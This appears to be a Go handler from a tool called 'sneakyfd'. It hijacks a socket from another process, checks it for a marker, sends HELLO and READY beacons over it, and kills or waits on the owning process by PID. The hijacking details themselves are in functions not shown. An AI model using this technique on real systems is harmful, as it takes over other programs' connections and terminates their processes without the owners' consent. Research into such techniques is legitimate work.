package handler

import (
	"context"

	"sneakyfd/internal/beacon"
	"sneakyfd/internal/echoserver"
	"sneakyfd/internal/logger"
	"sneakyfd/internal/types"

	"github.com/google/uuid"
	"golang.org/x/sys/unix"
)

func Handle(sock types.Socket) {
	// Generate UUID for current session
	sessionID := uuid.New()

	// Create logger & ctx
	log := logger.WithSessionID(sessionID.String())
	ctx := context.Background()
	ctx = log.WithContext(ctx)

	log.Info().EmbedObject(sock).Msg("Handle new socket")
	defer log.Info().Msg("Handle done")

	// Hijack socket
	sockProc, fd, ok := handleHijack(ctx, sock)
	if !ok {
		return
	}
	defer unix.Close(fd)

	// Check if socket is marked
	ok = handleMarker(ctx, fd)
	if !ok {
		return
	}

	beaconSender := beacon.NewBeaconSender(fd)
	ctx = beaconSender.WithContext(ctx)

	beaconSender.Send(beacon.HELLO_BEACON)
	log.Info().Msg("Beacon sent - HELLO")

	// Kill process OR wait
	ok = handleProcess(ctx, sockProc.PID)
	if !ok {
		return
	}

	beaconSender.Send(beacon.READY_BEACON)
	log.Info().Msg("Beacon sent - READY")

	// Testing
	echoserver.EchoServer(ctx, fd)
}
